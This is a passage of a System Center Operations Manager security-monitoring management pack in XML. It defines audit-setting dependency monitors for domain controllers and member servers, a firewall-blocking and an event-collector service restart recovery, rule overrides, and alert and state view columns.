      <DependencyMonitor ID="Security.Monitoring.SecurityGroupManagementforDC" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.DomainControllers" ParentMonitorID="Security.Monitoring.DCAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForDCs" MemberMonitor="Security.Monitoring.SGManagementDC">
        <Category>AvailabilityHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
      <DependencyMonitor ID="Security.Monitoring.UserAcctforMS" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.MemberServers" ParentMonitorID="Security.Monitoring.MemberServerAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForMemberServers" MemberMonitor="Security.Monitoring.UserAccountMgmtMS">
        <Category>AvailabilityHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
      <DependencyMonitor ID="Security.Monitoring.DCConfigGroupRollup" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.DomainControllers" ParentMonitorID="Security.Monitoring.DCAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForDCs" MemberMonitor="Security.Monitoring.SecurityAudit.ProcessCreationDC">
        <Category>ConfigurationHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
      <DependencyMonitor ID="Security.Monitoring.SpecialGroupLogonDC" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.DomainControllers" ParentMonitorID="Security.Monitoring.DCAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForDCs" MemberMonitor="Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC">
        <Category>AvailabilityHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
      <DependencyMonitor ID="Security.Monitoring.SpecialGroupLogonMS" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.MemberServers" ParentMonitorID="Security.Monitoring.MemberServerAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForMemberServers" MemberMonitor="Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers">
        <Category>AvailabilityHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
      <DependencyMonitor ID="Security.Monitoring.IncludeCommandLineonDCs" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.DomainControllers" ParentMonitorID="Security.Monitoring.DCAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForDCs" MemberMonitor="Security.Monitoring.IncludeCommandLineProcessCreationonDCs">
        <Category>ConfigurationHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
      <DependencyMonitor ID="Security.Monitoring.IncludeCommandLineonMS" Accessibility="Public" Enabled="true" Target="Security.Monitoring.SecurityMonitoringDA.MemberServers" ParentMonitorID="Security.Monitoring.MemberServerAuditSettings" Remotable="true" Priority="Normal" RelationshipType="Security.Monitoring.SecurityMonitoringDARelationshipsForMemberServers" MemberMonitor="Security.Monitoring.IncludeCommandLineProcessCreationonMS">
        <Category>ConfigurationHealth</Category>
        <Algorithm>WorstOf</Algorithm>
      </DependencyMonitor>
    </Monitors>
    <Recoveries>
      <Recovery ID="SecurityMonitoringMP.Recovery.BlockPortWindowsFW" Accessibility="Public" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" Monitor="SecurityMonitoringMP.Event.RepeatedLogonMonitor" ResetMonitor="false" ExecuteOnState="Warning" Remotable="true" Timeout="300">
        <Category>Custom</Category>
        <WriteAction ID="SecurityMonitoringMP.Recovery.NetSH" TypeID="System!System.CommandExecuter">
          <ApplicationName>%windir%\System32\netsh.exe</ApplicationName>
          <WorkingDirectory />
          <CommandLine>advfirewall firewall set rule name="Block RDP" new remoteip=$Data/StateChange/DataItem/Context/DataItem/Context/DataItem/Params/Param[20]$</CommandLine>
          <TimeoutSeconds>15</TimeoutSeconds>
          <RequireOutput>true</RequireOutput>
        </WriteAction>
      </Recovery>
      <Recovery ID="SecurityMonitoringMP.Recovery.RestartWecSVC" Accessibility="Public" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" Monitor="SecurityMonitoringMP.Health.EventCollectorMonitor" ResetMonitor="true" ExecuteOnState="Error" Remotable="true" Timeout="300">
        <Category>Custom</Category>
        <WriteAction ID="SecurityMonitoringMP.Recovery.RestartService" TypeID="System!System.CommandExecuter">
          <ApplicationName>%windir%\system32\net.exe</ApplicationName>
          <WorkingDirectory>%windir%</WorkingDirectory>
          <CommandLine>start wecsvc</CommandLine>
          <TimeoutSeconds>15</TimeoutSeconds>
          <RequireOutput>true</RequireOutput>
        </WriteAction>
      </Recovery>
    </Recoveries>
    <Overrides>
      <RulePropertyOverride ID="OverrideForRuleSecurityMonitoringMPEventLocalAdminChange.DomainControllers" Context="Windows!Microsoft.Windows.Server.DC.Computer" Enforced="false" Rule="SecurityMonitoringMP.Accounts.LocalAdminChange" Property="Enabled">
        <Value>false</Value>
      </RulePropertyOverride>
      <RulePropertyOverride ID="OverrideForRuleSecurityMonitoringEventSeDebugPrivilegeEscalation" Context="SystemCenter!Microsoft.SystemCenter.ManagementServer" Enforced="false" Rule="Security.Monitoring.Event.SeDebugPrivilegeEscalation" Property="Enabled">
        <Value>false</Value>
      </RulePropertyOverride>
      <RulePropertyOverride ID="OverrideForRuleSecurityMonitoringMPEventLocalAccountCreatedonServer.DomainControllers" Context="Windows!Microsoft.Windows.Server.DC.Computer" Enforced="false" Rule="SecurityMonitoringMP.Event.LocalAccountCreatedonServer" Property="Enabled">
        <Value>false</Value>
      </RulePropertyOverride>
      <RulePropertyOverride ID="OverrideForRuleSecurityMonitoringExecutableRunFromUserWriteableDirectory" Context="Security.Monitoring.WindowsComputersExtendedWriteableDirectoryMonitoring" Enforced="false" Rule="Security.Monitoring.ExecutableRunFromUserWriteableDirectory" Property="Enabled">
        <Value>false</Value>
      </RulePropertyOverride>
      <MonitorPropertyOverride ID="OverrideForMonitorSecurityMonitoringProcessCreationMemberServerForContextMicrosoftSystemCenterManagementServerComputersGroup" Context="SystemCenter!Microsoft.SystemCenter.ManagementServerComputersGroup" Enforced="false" Monitor="Security.Monitoring.ProcessCreationMemberServer" Property="Enabled">
        <Value>true</Value>
      </MonitorPropertyOverride>
      <MonitorPropertyOverride ID="OverrideForMonitorSecurityMonitoringSpecialGroupLogonMemberServerForContextMicrosoftSystemCenterManagementServerComputersGroup" Context="SystemCenter!Microsoft.SystemCenter.ManagementServerComputersGroup" Enforced="false" Monitor="Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers" Property="Enabled">
        <Value>true</Value>
      </MonitorPropertyOverride>
      <MonitorPropertyOverride ID="OverrideForMonitorSecurityMonitoringCommandLineAuditingMemberServerForContextMicrosoftSystemCenterManagementServerComputersGroup" Context="SystemCenter!Microsoft.SystemCenter.ManagementServerComputersGroup" Enforced="false" Monitor="Security.Monitoring.IncludeCommandLineProcessCreationonMS" Property="Enabled">
        <Value>true</Value>
      </MonitorPropertyOverride>
      <MonitorPropertyOverride ID="OverrideForMonitorSecurityMonitoringAccountLogonAuditingMemberServerForContextMicrosoftSystemCenterManagementServerComputersGroup" Context="SystemCenter!Microsoft.SystemCenter.ManagementServerComputersGroup" Enforced="false" Monitor="Security.Monitoring.AuditAccountLogonMS" Property="Enabled">
        <Value>true</Value>
      </MonitorPropertyOverride>
      <MonitorPropertyOverride ID="OverrideForMonitorSecurityMonitoringUserAccountManagementAuditingMemberServerForContextMicrosoftSystemCenterManagementServerComputersGroup" Context="SystemCenter!Microsoft.SystemCenter.ManagementServerComputersGroup" Enforced="false" Monitor="Security.Monitoring.UserAccountMgmtMS" Property="Enabled">
        <Value>true</Value>
      </MonitorPropertyOverride>
    </Overrides>
  </Monitoring>
  <Presentation>
    <Views>
      <View ID="SecurityMonitoringMP.View.SecurityMonitoringAlerts" Accessibility="Public" Enabled="true" Target="System!System.Entity" TypeID="SystemCenter!Microsoft.SystemCenter.AlertViewType" Visible="true">
        <Category>Operations</Category>
        <Criteria>
          <ResolutionState>
            <StateRange Operator="NotEquals">255</StateRange>
          </ResolutionState>
          <Name>Security Monitoring</Name>
        </Criteria>
        <Presentation>
          <ColumnInfo Index="0" SortIndex="0" Width="22" Grouped="true" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Severity</Name>
            <Id>Severity</Id>
          </ColumnInfo>
          <ColumnInfo Index="1" SortIndex="-1" Width="54" Grouped="false" Sorted="false" IsSortable="false" Visible="true" SortOrder="Ascending">
            <Name>Icon</Name>
            <Id>Icon</Id>
          </ColumnInfo>
          <ColumnInfo Index="2" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Path</Name>
            <Id>MonitoringObjectPath</Id>
          </ColumnInfo>
          <ColumnInfo Index="3" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Source</Name>
            <Id>MonitoringObjectDisplayName</Id>
          </ColumnInfo>
          <ColumnInfo Index="4" SortIndex="-1" Width="22" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Maintenance Mode</Name>
            <Id>MonitoringObjectInMaintenanceMode</Id>
          </ColumnInfo>
          <ColumnInfo Index="5" SortIndex="-1" Width="250" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Name</Name>
            <Id>Name</Id>
          </ColumnInfo>
          <ColumnInfo Index="6" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Resolution State</Name>
            <Id>ResolutionState</Id>
          </ColumnInfo>
          <ColumnInfo Index="7" SortIndex="-1" Width="150" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Created</Name>
            <Id>TimeRaised</Id>
          </ColumnInfo>
          <ColumnInfo Index="8" SortIndex="1" Width="100" Grouped="false" Sorted="true" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Age</Name>
            <Id>Age</Id>
          </ColumnInfo>
          <ColumnInfo Index="9" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Type</Name>
            <Id>Category</Id>
          </ColumnInfo>
          <ColumnInfo Index="10" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Owner</Name>
            <Id>Owner</Id>
          </ColumnInfo>
          <ColumnInfo Index="11" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Priority</Name>
            <Id>Priority</Id>
          </ColumnInfo>
          <ColumnInfo Index="12" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Latency</Name>
            <Id>Latency</Id>
          </ColumnInfo>
          <ColumnInfo Index="13" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Description</Name>
            <Id>Description</Id>
          </ColumnInfo>
          <ColumnInfo Index="14" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Connector</Name>
            <Id>ConnectorId</Id>
          </ColumnInfo>
          <ColumnInfo Index="15" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Forwarding Status</Name>
            <Id>ConnectorStatus</Id>
          </ColumnInfo>
          <ColumnInfo Index="16" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Class</Name>
            <Id>Class</Id>
          </ColumnInfo>
          <ColumnInfo Index="17" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Time in State</Name>
            <Id>TimeInState</Id>
          </ColumnInfo>
          <ColumnInfo Index="18" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 1</Name>
            <Id>CustomField1</Id>
          </ColumnInfo>
          <ColumnInfo Index="19" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 2</Name>
            <Id>CustomField2</Id>
          </ColumnInfo>
          <ColumnInfo Index="20" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 3</Name>
            <Id>CustomField3</Id>
          </ColumnInfo>
          <ColumnInfo Index="21" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 4</Name>
            <Id>CustomField4</Id>
          </ColumnInfo>
          <ColumnInfo Index="22" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 5</Name>
            <Id>CustomField5</Id>
          </ColumnInfo>
          <ColumnInfo Index="23" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 6</Name>
            <Id>CustomField6</Id>
          </ColumnInfo>
          <ColumnInfo Index="24" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 7</Name>
            <Id>CustomField7</Id>
          </ColumnInfo>
          <ColumnInfo Index="25" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 8</Name>
            <Id>CustomField8</Id>
          </ColumnInfo>
          <ColumnInfo Index="26" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 9</Name>
            <Id>CustomField9</Id>
          </ColumnInfo>
          <ColumnInfo Index="27" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 10</Name>
            <Id>CustomField10</Id>
          </ColumnInfo>
          <ColumnInfo Index="28" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Resolved By</Name>
            <Id>ResolvedBy</Id>
          </ColumnInfo>
          <ColumnInfo Index="29" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Time Resolved</Name>
            <Id>TimeResolved</Id>
          </ColumnInfo>
          <ColumnInfo Index="30" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Last State Change</Name>
            <Id>TimeResolutionStateLastModified</Id>
          </ColumnInfo>
          <ColumnInfo Index="31" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Last Modified</Name>
            <Id>LastModified</Id>
          </ColumnInfo>
          <ColumnInfo Index="32" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Last Modified By</Name>
            <Id>LastModifiedBy</Id>
          </ColumnInfo>
          <ColumnInfo Index="33" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Management Group</Name>
            <Id>ManagementGroup</Id>
          </ColumnInfo>
          <ColumnInfo Index="34" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Site</Name>
            <Id>SiteName</Id>
          </ColumnInfo>
          <ColumnInfo Index="35" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Repeat Count</Name>
            <Id>RepeatCount</Id>
          </ColumnInfo>
          <ColumnInfo Index="36" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Ticket ID</Name>
            <Id>TicketId</Id>
          </ColumnInfo>
          <ColumnInfo Index="37" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>TFS Work Item ID</Name>
            <Id>TfsWorkItemId</Id>
          </ColumnInfo>
          <ColumnInfo Index="38" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>TFS Work Item Owner</Name>
            <Id>TfsWorkItemOwner</Id>
          </ColumnInfo>
        </Presentation>
        <Target />
      </View>
      <View ID="SecurityMonitoringMP.View.EventCollectorState" Accessibility="Public" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" TypeID="SystemCenter!Microsoft.SystemCenter.StateViewType" Visible="true">
        <Category>Operations</Category>
        <Criteria>
          <InMaintenanceMode>false</InMaintenanceMode>
        </Criteria>
        <Presentation>
          <ColumnInfo Index="0" SortIndex="0" Width="100" Grouped="false" Sorted="true" IsSortable="true" Visible="true" SortOrder="Descending">
            <Name>State</Name>
            <Id>WindowsEventCollectorDiscovery.EventLogCollectorServer-*-db2d26e3-a6cc-30b9-4a02-70c1175dc7b8-*-Health</Id>
          </ColumnInfo>
          <ColumnInfo Index="1" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>In Maintenance Mode</Name>
            <Id>InMaintenanceMode</Id>
          </ColumnInfo>
          <ColumnInfo Index="2" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Name</Name>
            <Id>Name</Id>
          </ColumnInfo>
          <ColumnInfo Index="3" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Path</Name>
            <Id>Path</Id>
          </ColumnInfo>
          <ColumnInfo Index="4" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Display Name</Name>
            <Id>System.Entity/DisplayName</Id>
          </ColumnInfo>
        </Presentation>
        <Target />
      </View>
      <View ID="SecurityMonitoringMP.View.EventCollectorAlerts" Accessibility="Public" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" TypeID="SystemCenter!Microsoft.SystemCenter.AlertViewType" Visible="true">
        <Category>Operations</Category>
        <Criteria>
          <ResolutionState>
            <StateRange Operator="NotEquals">255</StateRange>
          </ResolutionState>
        </Criteria>
        <Presentation>
          <ColumnInfo Index="0" SortIndex="0" Width="22" Grouped="true" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Severity</Name>
            <Id>Severity</Id>
          </ColumnInfo>
          <ColumnInfo Index="1" SortIndex="-1" Width="54" Grouped="false" Sorted="false" IsSortable="false" Visible="true" SortOrder="Ascending">
            <Name>Icon</Name>
            <Id>Icon</Id>
          </ColumnInfo>
          <ColumnInfo Index="2" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Path</Name>
            <Id>MonitoringObjectPath</Id>
          </ColumnInfo>
          <ColumnInfo Index="3" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Source</Name>
            <Id>MonitoringObjectDisplayName</Id>
          </ColumnInfo>
          <ColumnInfo Index="4" SortIndex="-1" Width="22" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Maintenance Mode</Name>
            <Id>MonitoringObjectInMaintenanceMode</Id>
          </ColumnInfo>
          <ColumnInfo Index="5" SortIndex="-1" Width="250" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Name</Name>
            <Id>Name</Id>
          </ColumnInfo>
          <ColumnInfo Index="6" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Resolution State</Name>
            <Id>ResolutionState</Id>
          </ColumnInfo>
          <ColumnInfo Index="7" SortIndex="-1" Width="150" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Created</Name>
            <Id>TimeRaised</Id>
          </ColumnInfo>
          <ColumnInfo Index="8" SortIndex="1" Width="100" Grouped="false" Sorted="true" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Age</Name>
            <Id>Age</Id>
          </ColumnInfo>
          <ColumnInfo Index="9" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Type</Name>
            <Id>Category</Id>
          </ColumnInfo>
          <ColumnInfo Index="10" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Owner</Name>
            <Id>Owner</Id>
          </ColumnInfo>
          <ColumnInfo Index="11" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Priority</Name>
            <Id>Priority</Id>
          </ColumnInfo>
          <ColumnInfo Index="12" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Latency</Name>
            <Id>Latency</Id>
          </ColumnInfo>
          <ColumnInfo Index="13" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Description</Name>
            <Id>Description</Id>
          </ColumnInfo>
          <ColumnInfo Index="14" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Connector</Name>
            <Id>ConnectorId</Id>
          </ColumnInfo>
          <ColumnInfo Index="15" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Forwarding Status</Name>
            <Id>ConnectorStatus</Id>
          </ColumnInfo>
          <ColumnInfo Index="16" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Class</Name>
            <Id>Class</Id>
          </ColumnInfo>
          <ColumnInfo Index="17" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Time in State</Name>
            <Id>TimeInState</Id>
          </ColumnInfo>
          <ColumnInfo Index="18" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 1</Name>
            <Id>CustomField1</Id>
          </ColumnInfo>
          <ColumnInfo Index="19" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 2</Name>
            <Id>CustomField2</Id>
          </ColumnInfo>
          <ColumnInfo Index="20" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 3</Name>
            <Id>CustomField3</Id>
          </ColumnInfo>
          <ColumnInfo Index="21" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 4</Name>
            <Id>CustomField4</Id>
          </ColumnInfo>
          <ColumnInfo Index="22" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 5</Name>
            <Id>CustomField5</Id>
          </ColumnInfo>
          <ColumnInfo Index="23" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 6</Name>
            <Id>CustomField6</Id>
          </ColumnInfo>
          <ColumnInfo Index="24" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 7</Name>
            <Id>CustomField7</Id>
          </ColumnInfo>
          <ColumnInfo Index="25" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 8</Name>
            <Id>CustomField8</Id>
          </ColumnInfo>
          <ColumnInfo Index="26" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 9</Name>
            <Id>CustomField9</Id>
          </ColumnInfo>
          <ColumnInfo Index="27" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Custom Field 10</Name>
            <Id>CustomField10</Id>
          </ColumnInfo>
          <ColumnInfo Index="28" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Resolved By</Name>
            <Id>ResolvedBy</Id>
          </ColumnInfo>
          <ColumnInfo Index="29" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Time Resolved</Name>
            <Id>TimeResolved</Id>
          </ColumnInfo>
          <ColumnInfo Index="30" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Last State Change</Name>
            <Id>TimeResolutionStateLastModified</Id>
          </ColumnInfo>
          <ColumnInfo Index="31" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Last Modified</Name>
            <Id>LastModified</Id>
          </ColumnInfo>
          <ColumnInfo Index="32" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Last Modified By</Name>
            <Id>LastModifiedBy</Id>
          </ColumnInfo>
          <ColumnInfo Index="33" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Management Group</Name>
            <Id>ManagementGroup</Id>
          </ColumnInfo>
          <ColumnInfo Index="34" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Site</Name>
            <Id>SiteName</Id>
          </ColumnInfo>
          <ColumnInfo Index="35" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Repeat Count</Name>
            <Id>RepeatCount</Id>
          </ColumnInfo>
          <ColumnInfo Index="36" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Ticket ID</Name>
            <Id>TicketId</Id>
          </ColumnInfo>
          <ColumnInfo Index="37" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>TFS Work Item ID</Name>
            <Id>TfsWorkItemId</Id>
          </ColumnInfo>
          <ColumnInfo Index="38" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>TFS Work Item Owner</Name>
            <Id>TfsWorkItemOwner</Id>
          </ColumnInfo>
        </Presentation>
        <Target />
      </View>
      <View ID="SecurityMonitoringMP.View.ThreatHuntingAlert" Accessibility="Public" Enabled="true" Target="System!System.Entity" TypeID="SystemCenter!Microsoft.SystemCenter.AlertViewType" Visible="true">
        <Category>Operations</Category>
        <Criteria>
          <ResolutionState>
            <StateRange Operator="NotEquals">255</StateRange>
          </ResolutionState>
          <Name>Security Monitoring Threat Hunting</Name>
        </Criteria>
        <Presentation>
          <ColumnInfo Index="0" SortIndex="0" Width="22" Grouped="true" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Severity</Name>
            <Id>Severity</Id>
          </ColumnInfo>
          <ColumnInfo Index="1" SortIndex="-1" Width="54" Grouped="false" Sorted="false" IsSortable="false" Visible="true" SortOrder="Ascending">
            <Name>Icon</Name>
            <Id>Icon</Id>
          </ColumnInfo>
          <ColumnInfo Index="2" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="false" SortOrder="Ascending">
            <Name>Path</Name>
            <Id>MonitoringObjectPath</Id>
          </ColumnInfo>
          <ColumnInfo Index="3" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Source</Name>
            <Id>MonitoringObjectDisplayName</Id>
          </ColumnInfo>
          <ColumnInfo Index="4" SortIndex="-1" Width="22" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Maintenance Mode</Name>
            <Id>MonitoringObjectInMaintenanceMode</Id>
          </ColumnInfo>
          <ColumnInfo Index="5" SortIndex="-1" Width="250" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Name</Name>
            <Id>Name</Id>
          </ColumnInfo>
          <ColumnInfo Index="6" SortIndex="-1" Width="100" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Resolution State</Name>
            <Id>ResolutionState</Id>
          </ColumnInfo>
          <ColumnInfo Index="7" SortIndex="-1" Width="150" Grouped="false" Sorted="false" IsSortable="true" Visible="true" SortOrder="Ascending">
            <Name>Created</Name>
            <Id>TimeRaised</Id>
          </ColumnInfo>
